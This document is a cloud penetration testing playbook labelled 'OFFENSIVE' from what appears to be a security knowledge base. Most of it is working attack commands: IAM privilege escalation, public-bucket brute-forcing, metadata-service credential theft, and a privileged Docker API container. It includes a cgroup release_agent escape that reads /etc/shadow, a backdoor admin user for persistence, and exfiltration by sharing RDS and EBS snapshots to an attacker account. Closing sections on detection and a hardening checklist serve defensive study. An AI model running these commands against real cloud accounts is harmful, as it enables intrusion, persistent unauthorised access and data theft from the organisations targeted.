# Cloud Penetration Testing

> Rush Seed — Palace Security Knowledge Base
> Classification: OFFENSIVE — FOUNDER EYES ONLY
> Version: 1.0 | Created: 2026-03-09

---

## 1. Cloud Security Landscape

Cloud environments expand the attack surface exponentially. Misconfigurations are the #1 cloud vulnerability — not zero-days. Rush's principle: **the cloud doesn't eliminate security problems, it multiplies them across every service you enable.**

### 1.1 Shared Responsibility Model

```
| Responsibility          | IaaS (EC2)    | PaaS (Lambda) | SaaS (S3)     |
|------------------------|---------------|---------------|----------------|
| Data classification    | Customer      | Customer      | Customer       |
| Identity & access      | Customer      | Customer      | Customer       |
| Application security   | Customer      | Customer      | Shared         |
| Network controls       | Customer      | Shared        | Provider       |
| OS patching            | Customer      | Provider      | Provider       |
| Infrastructure         | Provider      | Provider      | Provider       |
| Physical security      | Provider      | Provider      | Provider       |

Key insight: CUSTOMER is responsible for CONFIGURATION in ALL models.
Misconfigurations are YOUR fault, not the cloud provider's.
```

### 1.2 Common Cloud Attack Vectors

1. **IAM Misconfigurations** — Overly permissive roles and policies
2. **Exposed Storage** — Public S3 buckets, Azure blobs, GCS buckets
3. **Metadata Service Abuse** — SSRF to cloud metadata endpoints
4. **Credential Exposure** — Keys in code, environment variables, logs
5. **Serverless Injection** — Lambda/Functions with unsanitized input
6. **Container Escape** — Breaking out of Docker/K8s to host
7. **Network Misconfigurations** — Open security groups, public subnets
8. **Logging Gaps** — CloudTrail disabled, no monitoring
9. **Cross-Account Access** — Overly permissive trust policies
10. **API Gateway Bypass** — Direct service access bypassing gateway

---

## 2. AWS Security Assessment

### 2.1 IAM Enumeration and Exploitation

```bash
# Enumerate current identity
aws sts get-caller-identity

# List all IAM users
aws iam list-users

# List all IAM roles
aws iam list-roles

# Get user's attached policies
aws iam list-attached-user-policies --user-name TARGET_USER
aws iam list-user-policies --user-name TARGET_USER  # inline policies

# Get policy details
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# Check for privilege escalation paths
# Tool: Pacu (AWS exploitation framework)
pacu
> import_keys ACCESS_KEY SECRET_KEY
> run iam__enum_permissions
> run iam__privesc_scan

# Common privilege escalation techniques:
# 1. iam:CreatePolicyVersion — create new version of existing policy
# 2. iam:SetDefaultPolicyVersion — activate a more permissive version
# 3. iam:AttachUserPolicy — attach AdministratorAccess to yourself
# 4. iam:CreateLoginProfile — create console login for service account
# 5. iam:UpdateLoginProfile — change another user's password
# 6. iam:PassRole + lambda:CreateFunction — create Lambda with admin role
# 7. iam:PassRole + ec2:RunInstances — launch EC2 with admin role
# 8. sts:AssumeRole — assume a more privileged role
```

**Dangerous IAM Policies:**
```json
// CRITICAL: Wildcard admin
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// HIGH: S3 full access
{
  "Effect": "Allow",
  "Action": "s3:*",
  "Resource": "*"
}

// HIGH: PassRole without restriction
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "*"
}

// MEDIUM: Overly permissive STS
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "*"
}
```

### 2.2 S3 Bucket Enumeration and Exploitation

```bash
# Discover buckets by name guessing
# Common patterns: [company]-backup, [company]-data, [company]-logs
for bucket in $(cat bucket_wordlist.txt); do
  aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo "PUBLIC: $bucket"
done

# Check bucket permissions
aws s3api get-bucket-acl --bucket TARGET_BUCKET
aws s3api get-bucket-policy --bucket TARGET_BUCKET

# List bucket contents
aws s3 ls s3://TARGET_BUCKET --recursive --no-sign-request

# Download interesting files
aws s3 cp s3://TARGET_BUCKET/backup.sql . --no-sign-request

# Check for write access
aws s3 cp test.txt s3://TARGET_BUCKET/ --no-sign-request

# Bucket policy enumeration
aws s3api get-bucket-policy --bucket TARGET_BUCKET --output json

# Tools for S3 enumeration:
# - bucket_finder
# - S3Scanner
# - AWSBucketDump
# - cloud_enum

# Check for bucket misconfiguration
# ACL: public-read, public-read-write, authenticated-users
# Policy: Principal: "*" with s3:GetObject
```

### 2.3 EC2 Metadata Service (IMDS) Exploitation

```bash
# Instance Metadata Service v1 (IMDSv1) — SSRF target
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Returns temporary credentials:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }

# IMDSv2 requires token (harder to exploit via SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# User data (may contain secrets)
curl http://169.254.169.254/latest/user-data/

# Other useful metadata endpoints:
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4
/latest/meta-data/security-groups
/latest/meta-data/network/interfaces/macs/
/latest/dynamic/instance-identity/document
```

### 2.4 Lambda and Serverless Attacks

```bash
# List Lambda functions
aws lambda list-functions

# Get function configuration (may reveal env vars with secrets)
aws lambda get-function --function-name TARGET_FUNCTION

# Get function code
aws lambda get-function --function-name TARGET_FUNCTION --query 'Code.Location' --output text | xargs curl -o function.zip

# Event source mapping (triggers)
aws lambda list-event-source-mappings --function-name TARGET_FUNCTION

# Lambda environment variable extraction
aws lambda get-function-configuration --function-name TARGET_FUNCTION \
  --query 'Environment.Variables'

# Lambda injection techniques:
# 1. Event data injection (unsanitized input in event object)
# 2. Environment variable manipulation
# 3. Dependency confusion (malicious packages)
# 4. Runtime manipulation via layers
# 5. /tmp directory persistence between warm invocations
```

### 2.5 AWS Network Assessment

```bash
# List VPCs
aws ec2 describe-vpcs

# List security groups (firewall rules)
aws ec2 describe-security-groups

# Find overly permissive security groups
aws ec2 describe-security-groups --query \
  'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'

# List public-facing EC2 instances
aws ec2 describe-instances --query \
  'Reservations[].Instances[?PublicIpAddress!=null].[InstanceId,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' \
  --output table

# List exposed RDS instances
aws rds describe-db-instances --query \
  'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address]'

# List exposed ELBs
aws elbv2 describe-load-balancers --query 'LoadBalancers[?Scheme==`internet-facing`]'

# VPC Flow Logs (if accessible)
aws ec2 describe-flow-logs

# Route tables
aws ec2 describe-route-tables
```

### 2.6 AWS Post-Exploitation

```bash
# Establish persistence
# 1. Create new IAM user
aws iam create-user --user-name maintenance-svc
aws iam create-access-key --user-name maintenance-svc
aws iam attach-user-policy --user-name maintenance-svc \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. Create backdoor Lambda function
# 3. Add SSH key to EC2 instances
# 4. Create cross-account role trust
# 5. Modify security group rules

# Data exfiltration
# S3 bucket copy
aws s3 sync s3://target-bucket ./exfil/

# RDS snapshot sharing
aws rds create-db-snapshot --db-instance-identifier TARGET --db-snapshot-identifier exfil
aws rds modify-db-snapshot-attribute --db-snapshot-identifier exfil \
  --attribute-name restore --values-to-add ATTACKER_ACCOUNT_ID

# EBS snapshot sharing
aws ec2 create-snapshot --volume-id vol-xxx
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx \
  --attribute createVolumePermission --operation-type add --user-ids ATTACKER_ACCOUNT

# Cover tracks (check CloudTrail status first)
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name default
```

---

## 3. Azure Security Assessment

### 3.1 Azure AD Enumeration

```bash
# Azure CLI authentication
az login

# Get current user info
az account show
az ad signed-in-user show

# List all users
az ad user list --output table

# List all groups
az ad group list --output table

# List all applications (service principals)
az ad app list --output table
az ad sp list --output table

# List role assignments
az role assignment list --all --output table

# Find over-privileged accounts
az role assignment list --role "Owner" --all
az role assignment list --role "Contributor" --all

# List subscriptions
az account list --output table

# Resource enumeration
az resource list --output table
```

### 3.2 Azure Storage Exploitation

```bash
# List storage accounts
az storage account list --output table

# Check for public blob containers
az storage container list --account-name TARGET_ACCOUNT --output table

# Check container access level
az storage container show --name TARGET_CONTAINER --account-name TARGET_ACCOUNT \
  --query publicAccess

# Access public blobs
curl https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# List blobs in public container
az storage blob list --container-name TARGET --account-name TARGET_ACCOUNT

# Download blobs
az storage blob download --container-name TARGET --name secret.conf \
  --file ./secret.conf --account-name TARGET_ACCOUNT

# Check for shared access signatures (SAS) in URLs
# SAS tokens in URLs grant time-limited access
# Look for: ?sv=2020-08-04&ss=b&srt=sco&sp=rwdlacitp&se=...&sig=...
```

### 3.3 Azure Managed Identity Exploitation

```bash
# From compromised Azure VM — get managed identity token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token for Azure API calls
az login --identity
az account show

# From Azure Function — environment variables
# IDENTITY_ENDPOINT and IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

# Azure Instance Metadata Service
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
```

### 3.4 Azure Key Vault

```bash
# List key vaults
az keyvault list --output table

# List secrets in vault
az keyvault secret list --vault-name TARGET_VAULT --output table

# Get secret value
az keyvault secret show --vault-name TARGET_VAULT --name SECRET_NAME

# List keys
az keyvault key list --vault-name TARGET_VAULT

# List certificates
az keyvault certificate list --vault-name TARGET_VAULT

# Check access policies
az keyvault show --name TARGET_VAULT --query properties.accessPolicies
```

---

## 4. GCP Security Assessment

### 4.1 GCP Enumeration

```bash
# Authenticate
gcloud auth login
gcloud auth activate-service-account --key-file=key.json

# Current identity
gcloud config list account

# List projects
gcloud projects list

# List all IAM policies for project
gcloud projects get-iam-policy PROJECT_ID

# List service accounts
gcloud iam service-accounts list --project PROJECT_ID

# List service account keys
gcloud iam service-accounts keys list --iam-account SA_EMAIL

# List compute instances
gcloud compute instances list

# List storage buckets
gsutil ls

# List Cloud Functions
gcloud functions list

# List GKE clusters
gcloud container clusters list
```

### 4.2 GCP Storage Exploitation

```bash
# List bucket contents
gsutil ls gs://TARGET_BUCKET/

# Check bucket ACL
gsutil iam get gs://TARGET_BUCKET/

# Download from public bucket
gsutil cp gs://TARGET_BUCKET/sensitive_file.txt ./

# Check for allUsers or allAuthenticatedUsers access
gsutil iam get gs://TARGET_BUCKET/ | grep -E "allUsers|allAuthenticatedUsers"

# Bucket enumeration by name
for bucket in $(cat gcp_bucket_wordlist.txt); do
  gsutil ls gs://$bucket 2>/dev/null && echo "ACCESSIBLE: $bucket"
done
```

### 4.3 GCP Metadata Service

```bash
# GCP metadata endpoint
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# Get service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get project metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/"

# Get instance SSH keys
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Custom metadata (may contain secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"

# Startup script (may contain secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"
```

---

## 5. Container and Kubernetes Security

### 5.1 Docker Security

```bash
# Check for exposed Docker socket
curl http://TARGET:2375/version
curl http://TARGET:2376/version

# List containers via exposed API
curl http://TARGET:2375/containers/json

# Create privileged container (full host access)
curl -X POST http://TARGET:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'

# Docker socket mount escape
# If /var/run/docker.sock is mounted in container:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Check container capabilities
capsh --print

# Container escape via privileged mode
# If container is privileged:
mkdir /tmp/escape
mount -t cgroup -o rdma cgroup /tmp/escape
echo 1 > /tmp/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo 0 > /tmp/escape/cgroup.procs"
cat /output
```

### 5.2 Kubernetes Security

```bash
# Check if running in K8s pod
ls /var/run/secrets/kubernetes.io/serviceaccount/

# Read service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Enumerate K8s API
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s $APISERVER/api/v1/namespaces --header "Authorization: Bearer $TOKEN" -k

# List pods
kubectl get pods --all-namespaces

# List secrets
kubectl get secrets --all-namespaces

# Read secrets
kubectl get secret SECRET_NAME -o jsonpath='{.data}' | base64 -d

# Check RBAC permissions
kubectl auth can-i --list

# Node access from pod (if hostPID/hostNetwork enabled)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# etcd direct access (if reachable)
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only
```

---

## 6. Cloud Security Tools

### 6.1 Multi-Cloud Assessment Tools

```bash
# ScoutSuite — multi-cloud security auditing
scout aws --profile TARGET_PROFILE
scout azure --cli
scout gcp --project-id TARGET_PROJECT

# Prowler — AWS security best practices
prowler aws

# CloudSploit — open-source cloud security scanning
cloudsploit scan --cloud aws --config config.js

# Pacu — AWS exploitation framework
pacu
> import_keys ACCESS_KEY SECRET_KEY
> run iam__enum_permissions
> run iam__privesc_scan
> run s3__bucket_finder
> run ec2__enum

# CloudFox — automating cloud penetration testing
cloudfox aws inventory --profile TARGET
cloudfox aws permissions --profile TARGET
cloudfox aws endpoints --profile TARGET

# Enumerate exposed cloud services
cloud_enum -k target-company -k targetcompany
```

### 6.2 Infrastructure as Code Analysis

```bash
# Checkov — IaC security scanning
checkov -d /path/to/terraform/
checkov -f cloudformation.yaml

# tfsec — Terraform security scanner
tfsec /path/to/terraform/

# Terrascan — IaC security scanner
terrascan scan -i terraform -d /path/to/terraform/

# Common IaC misconfigurations:
# - S3 buckets without encryption
# - Security groups with 0.0.0.0/0
# - RDS without encryption at rest
# - CloudTrail not enabled
# - VPC Flow Logs not enabled
# - Root account with access keys
# - Lambda with admin permissions
# - EBS volumes unencrypted
```

---

## 7. Cloud Privilege Escalation

### 7.1 AWS Privilege Escalation Paths

```
Known escalation techniques (21+ methods):

1.  iam:CreatePolicyVersion
    → Create new policy version with admin access
    → Set as default version

2.  iam:SetDefaultPolicyVersion
    → Switch to a more permissive policy version

3.  iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
    → Create Lambda with admin role
    → Invoke it to execute admin actions

4.  iam:PassRole + ec2:RunInstances
    → Launch EC2 with admin instance profile
    → SSH in and use metadata service

5.  iam:CreateLoginProfile / iam:UpdateLoginProfile
    → Set console password for another user

6.  iam:CreateAccessKey
    → Create access keys for another user

7.  iam:PutUserPolicy / iam:PutGroupPolicy / iam:PutRolePolicy
    → Attach inline admin policy

8.  iam:AttachUserPolicy / iam:AttachGroupPolicy / iam:AttachRolePolicy
    → Attach managed admin policy

9.  sts:AssumeRole
    → Assume a more privileged role

10. lambda:UpdateFunctionCode
    → Modify existing Lambda to execute attacker code

11. glue:CreateDevEndpoint + iam:PassRole
    → Create Glue endpoint with admin role + SSH access

12. cloudformation:CreateStack + iam:PassRole
    → Create stack that creates admin resources

13. datapipeline:CreatePipeline + iam:PassRole
    → Create pipeline with admin role

14. ec2:CreateKeyPair + ec2:RunInstances
    → Launch instance with your key pair

15. ssm:StartSession
    → SSM session to EC2 with privileged role
```

### 7.2 Azure Privilege Escalation

```
Key escalation paths:

1. Contributor → Owner
   - If Contributor has User Access Administrator
   - Assign Owner role to self

2. Virtual Machine Contributor
   - Run commands on VMs with managed identities
   - Steal managed identity tokens

3. Automation Account
   - Run As accounts with elevated permissions
   - Execute arbitrary code with those permissions

4. Key Vault access
   - Read secrets containing credentials
   - Pivot to higher-privilege accounts

5. Azure AD roles
   - Global Administrator = full control
   - Application Administrator = create app with permissions
   - Privileged Role Administrator = grant any role

6. Managed Identity abuse
   - System-assigned identity on VM
   - Get token from metadata service
   - Use token for Azure API calls

7. Service Principal secrets
   - List app registrations
   - Create new secret for existing app
   - Use app's permissions
```

---

## 8. Cloud Forensics and Detection

### 8.1 AWS CloudTrail Analysis

```bash
# Check CloudTrail status
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name default

# Search for suspicious events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
  --start-time 2026-03-01 --end-time 2026-03-09

# Search for IAM changes
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventSource,AttributeValue=iam.amazonaws.com

# Common attacker indicators in CloudTrail:
# - CreateUser / CreateAccessKey from unusual source
# - AssumeRole to high-privilege roles
# - GetSecretValue from Secrets Manager
# - ConsoleLogin from unusual IP/location
# - Disabled CloudTrail / GuardDuty
# - S3 GetObject for sensitive buckets
# - RunInstances with instance profiles
# - CreatePolicyVersion / AttachPolicy
```

### 8.2 Detection Strategies

```
High-Fidelity Alerts:
1. CloudTrail disabled or modified
2. New IAM user or access key created
3. Policy attached granting admin access
4. S3 bucket policy changed to public
5. Security group modified to allow 0.0.0.0/0
6. Console login from new IP/country
7. API calls from unusual IP ranges
8. High volume of API errors (enumeration)
9. Metadata service access spikes
10. Cross-account role assumptions
```

---

## 9. Rush's Cloud Security Checklist

```
AWS:
[ ] CloudTrail enabled in all regions
[ ] S3 buckets not public
[ ] No wildcard IAM policies
[ ] MFA on root account
[ ] IMDSv2 enforced
[ ] Security groups reviewed
[ ] RDS not publicly accessible
[ ] EBS encryption enabled
[ ] Lambda env vars encrypted
[ ] GuardDuty enabled

Azure:
[ ] Azure AD MFA enforced
[ ] Storage accounts not public
[ ] NSGs reviewed
[ ] Key Vault access policies audited
[ ] Activity Log monitoring
[ ] Managed identities over service principals
[ ] Conditional Access policies
[ ] PIM for privileged roles

GCP:
[ ] Organization policies set
[ ] Service accounts minimal permissions
[ ] Cloud Storage buckets not public
[ ] VPC firewall rules reviewed
[ ] Audit logging enabled
[ ] Workload Identity over service account keys
```

---

*Rush knows that the cloud is just someone else's computer — with someone else's misconfigurations. Every IAM policy is an attack surface. Every bucket is a potential leak. Every metadata endpoint is a credential goldmine. The cloud doesn't protect you. Your configuration does.*
